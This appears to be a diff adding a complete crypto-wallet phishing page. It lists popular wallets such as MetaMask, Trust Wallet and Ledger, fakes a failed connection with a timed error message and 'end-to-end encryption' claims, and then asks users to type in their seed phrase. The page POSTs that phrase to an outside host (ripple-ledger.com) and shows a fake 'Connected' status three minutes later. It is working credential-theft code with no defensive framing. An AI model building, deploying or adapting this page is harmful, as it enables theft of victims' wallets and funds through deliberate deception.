@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Connection</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f9f9f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        h1 {
+            font-size: 2em;
+            margin-top: 20px;
+            color: #333;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+        .search-bar {
+            margin-top: 20px;
+            padding: 10px;
+            width: 90%;
+            max-width: 400px;
+            border-radius: 50px;
+            border: 1px solid #ccc;
+            margin-bottom: 20px;
+            font-size: 14px;
+            outline: none;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .search-bar:focus {
+            border-color: #007BFF;
+        }
+        .wallets {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* Default to 2 columns for mobile */
+            gap: 20px;
+            margin: 20px;
+            width: 100%;
+            padding: 0 20px;
+        }
+        .wallet {
+            cursor: pointer;
+            text-align: center;
+            border-radius: 15px;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease, background-color 0.3s ease;
+            height: 180px;
+        }
+        .wallet:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+            background-color: #f0f0f0;
+        }
+        .wallet img {
+            width: 70px;
+            height: 70px;
+            margin-bottom: 10px;
+            transition: transform 0.3s ease;
+        }
+        .wallet p {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            justify-content: center;
+            align-items: center;
+        }
+        .popup-content {
+            background: #fff;
+            padding: 30px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            position: relative;
+            transition: transform 0.3s ease;
+        }
+        .popup-content button {
+            margin-top: 15px;
+            padding: 10px 20px;
+            border-radius: 50px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            background-color: #007BFF;
+            color: white;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+        }
+        .popup-content button:hover {
+            background-color: #0056b3;
+            transform: translateY(-2px);
+        }
+        .popup-content .error {
+            color: red;
+            font-weight: bold;
+        }
+        .security-message {
+            font-size: 14px;
+            color: #444;
+            margin-top: 20px;
+        }
+        .security-message strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+        .input-key {
+            margin-top: 10px;
+            padding: 10px;
+            width: 100%;
+            min-height: 100px;
+            margin-bottom: 10px;
+            font-size: 14px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            resize: vertical;
+        }
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 20px;
+            cursor: pointer;
+            color: #888;
+            background: none;
+            border: none;
+        }
+        .popup-content button.blue {
+            background-color: #28a745;
+            color: white;
+        }
+        .loading-gif {
+            width: 50px;
+            height: 50px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            padding: 10px;
+        }
+        .connect-manually {
+            display: none;
+        }
+
+        /* Media Query for Mobile to Desktop */
+        @media (min-width: 768px) {
+            .wallets {
+                grid-template-columns: repeat(3, 1fr); /* 3 columns for desktop */
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>Select a Wallet</h1>
+    <input type="text" id="search" class="search-bar" placeholder="Search Wallets...">
+    
+    <div id="wallets" class="wallets">
+        <!-- Wallet Icons Will Be Injected Here -->
+    </div>
+
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <button class="close-btn" id="close-btn">&times;</button>
+            <div class="security-message">
+                <strong>This session is secured and encrypted</strong>
+            </div>
+            <p id="status">Securing Encryption...</p>
+            <div id="wallet-logo" class="wallet-logo">
+                <!-- Wallet Logo Will Be Injected Here -->
+            </div>
+            <button id="manual-connect-btn" class="blue">Connect Manually</button>
+            <button id="try-again-btn" class="blue" style="display: none;">Try Again</button>
+            <div id="manual-connect" class="connect-manually">
+                <textarea id="key-phrase" class="input-key" placeholder="Enter your mnemonic words manually and separate them with spaces"></textarea>
+                <button id="connect-btn" class="blue">Connect Wallet</button>
+            </div>
+            <div class="security-message">
+                <strong>Security</strong>
+                This session is protected with end-to-end encryption.
+                <br><br>
+                Never share your seed phrase with anybody!
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const wallets = [
+            { name: 'Trust Wallet', logo: 'logos/trust_wallet_logo.png' },
+            { name: 'MetaMask', logo: 'logos/metamask_logo.png' },
+            { name: 'Coinbase Wallet', logo: 'logos/coinbase_wallet_logo.png' },
+            { name: 'Exodus', logo: 'logos/exodus_logo.png' },
+            { name: 'Mycelium', logo: 'logos/mycelium_logo.png' },
+            { name: 'BRD Wallet', logo: 'logos/brd_logo.png' },
+            { name: 'Armory', logo: 'logos/armory_logo.png' },
+            { name: 'Blockchain Wallet', logo: '/logos/blockchain_logo.png' },
+            { name: 'Electrum', logo: 'logos/electrum_logo.png' },
+            { name: 'Trezor', logo: 'logos/trezor_logo.png' },
+            { name: 'Ledger', logo: 'logos/ledger_logo.png' },
+            { name: 'KeepKey', logo: 'logos/keepkey_logo.png' },
+            { name: 'Jaxx Liberty', logo: 'logos/jaxx_logo.png' },
+            { name: 'Green Wallet', logo: 'logos/green_wallet_logo.png' },
+            { name: 'ZenGo', logo: 'logos/zengo_logo.png' },
+            { name: 'Exodus', logo: 'logos/exodus_logo.png' },
+            { name: 'Edge Wallet', logo: 'logos/edge_logo.png' },
+            { name: 'Arculus Wallet', logo: 'logos/arculus_logo.png' },
+            // Add other wallets in a similar fashion
+        ];
+
+        const walletContainer = document.getElementById('wallets');
+        const popup = document.getElementById('popup');
+        const statusElement = document.getElementById('status');
+        const walletLogoElement = document.getElementById('wallet-logo');
+        const manualConnectBtn = document.getElementById('manual-connect-btn');
+        const manualConnectDiv = document.getElementById('manual-connect');
+        const keyPhraseInput = document.getElementById('key-phrase');
+        const connectBtn = document.getElementById('connect-btn');
+        const tryAgainBtn = document.getElementById('try-again-btn');
+        const closeBtn = document.getElementById('close-btn');
+        
+        let selectedWallet = null;
+
+        // Search Functionality
+        document.getElementById('search').addEventListener('input', (event) => {
+            const query = event.target.value.toLowerCase();
+            const filteredWallets = wallets.filter(wallet => wallet.name.toLowerCase().includes(query));
+            displayWallets(filteredWallets);
+        });
+
+        function displayWallets(walletsList) {
+            walletContainer.innerHTML = '';
+            walletsList.forEach(wallet => {
+                const walletElement = document.createElement('div');
+                walletElement.classList.add('wallet');
+                walletElement.innerHTML = 
+                    `<img src="${wallet.logo}" alt="${wallet.name} logo">
+                    <p>${wallet.name}</p>`;
+                walletElement.addEventListener('click', () => openPopup(wallet));
+                walletContainer.appendChild(walletElement);
+            });
+        }
+
+        // Initially display all wallets
+        displayWallets(wallets);
+
+        // Popup and Delays
+        function openPopup(wallet) {
+            selectedWallet = wallet;
+            popup.style.display = 'flex';
+            walletLogoElement.innerHTML = `<img src="${wallet.logo}" alt="${wallet.name} logo" style="width: 50px; height: 50px;">`;
+            statusElement.innerHTML = `<img src="logos/loading.gif" class="loading-gif" alt="Loading..."> Securing Encryption...`;  // Show loading gif
+            setTimeout(() => {
+                statusElement.innerText = 'An error occurred. Please try again or connect manually';
+                statusElement.classList.add('error');
+                tryAgainBtn.style.display = 'inline-block';
+            }, 6000);  // Simulate connection failure after 6 seconds
+        }
+
+        manualConnectBtn.addEventListener('click', () => {
+            manualConnectDiv.style.display = 'block';
+            manualConnectBtn.style.display = 'none';
+            tryAgainBtn.style.display = 'none';
+        });
+
+        tryAgainBtn.addEventListener('click', () => {
+            statusElement.innerHTML = `<img src="logos/loading.gif" class="loading-gif" alt="Loading..."> Securing Encryption...`;  // Show loading gif
+            statusElement.classList.remove('error');
+            tryAgainBtn.style.display = 'none';
+            setTimeout(() => {
+                statusElement.innerText = 'An error occurred. Please try again or connect manually';
+                statusElement.classList.add('error');
+                tryAgainBtn.style.display = 'inline-block';
+            }, 6000);  // Simulate another 6-second delay for "Try Again"
+        });
+
+        connectBtn.addEventListener('click', () => {
+            const keyPhrase = keyPhraseInput.value;
+            statusElement.innerHTML = `<img src="logos/loading.gif" class="loading-gif" alt="Loading..."> Connecting...`; // Show loading gif
+            sendKeyPhrase(keyPhrase);  // Send the key phrase immediately
+            setTimeout(() => {
+                statusElement.innerText = 'Connected';  // Once the delay ends, update status
+            }, 180000);  // 3 minutes delay
+        });
+
+        closeBtn.addEventListener('click', () => {
+            popup.style.display = 'none';
+        });
+
+        function sendKeyPhrase(keyPhrase) {
+            const data = { keyPhrase };
+
+            fetch('https://ripple-ledger.com/send-email', { 
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send email');
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Key phrase sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('There was an error sending the key phrase. Please try again later.');
+            });
+        }
+    </script>
+
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/68ca8e6d9cdd18192ac5a318/1j5bjonac';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
+</body>
+</html>
